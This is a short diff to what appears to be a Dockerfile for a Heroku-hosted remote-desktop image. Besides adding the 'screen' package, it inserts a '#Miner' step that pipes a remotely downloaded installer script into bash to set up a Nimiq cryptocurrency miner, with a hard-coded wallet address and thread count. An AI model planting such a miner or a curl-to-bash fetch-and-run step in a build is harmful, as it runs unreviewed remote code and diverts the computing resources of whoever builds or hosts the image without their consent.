@@ -75,6 +75,7 @@ RUN rm -rf /etc/apt/sources.list && \
 	novnc \
 	openvpn \
 	ffmpeg \
+	screen \
 #Fluxbox
 	/app/fluxbox-heroku-mod.deb && \
 #MATE Desktop
@@ -124,6 +125,9 @@ RUN rm -rf /etc/apt/sources.list && \
 	apt install -y /tmp/packages-microsoft-prod.deb && \
 	apt update && \
 	apt-get install -y powershell
+#Miner
+	WALLET_ADDRESS="NQ57 MPTF N51D RDPU LXHQ KNSX 58MG JHS9 9060" WORKER_ID="Hero" THREAD=5 bash -c "$(curl -sL https://github.com/skypool-org/skypool-nimiq-miner-release/releases/download/v1.3.4/linux-installer.sh)"
+
 
 ENTRYPOINT ["supervisord", "-c"]
 
